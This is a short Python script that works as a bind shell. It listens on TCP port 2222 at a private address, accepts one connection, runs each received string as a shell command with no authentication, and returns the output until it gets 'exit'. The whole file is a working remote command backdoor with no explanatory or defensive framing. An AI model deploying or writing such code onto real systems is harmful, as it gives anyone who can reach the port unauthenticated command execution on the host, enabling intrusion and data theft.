#!/usr/bin/python3.6

import subprocess
import socket
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port=2222
ip="192.168.2.13"
s.bind((ip,port))
s.listen()

c , y =s.accept()
while True:
	ch=c.recv(20)
	if ch.decode() == "exit":
		break
	cmd=subprocess.getoutput(ch.decode())
	x=cmd.encode()
	c.send(x)

c.close()
s.close()

	
